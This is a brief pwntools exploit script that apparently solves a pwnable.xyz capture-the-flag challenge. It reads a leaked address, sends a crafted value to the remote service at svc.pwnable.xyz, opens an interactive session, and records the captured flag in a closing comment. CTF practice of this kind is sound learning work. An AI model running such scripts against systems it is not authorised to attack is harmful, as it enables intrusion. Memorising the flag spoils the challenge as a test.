from pwn import *

HOST, PORT = "svc.pwnable.xyz", 30000
EXE = "./challenge"
gs = """
break _start
continue
"""

def start():
    if args.GDB:
        return gdb.debug(EXE, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(EXE)

# ========== Exploit script here ==========
if __name__ == '__main__':
    elf = context.binary = ELF(EXE)
    io = start()

    io.recvuntil(b'Leak: ')
    leak = int(io.recvline().strip(), 16)

    io.sendlineafter(b': ', str(leak + 1).encode())
    io.sendlineafter(b': ', b'hehe')

    io.interactive()

# Flag: FLAG{did_you_really_need_a_script_to_solve_this_one?}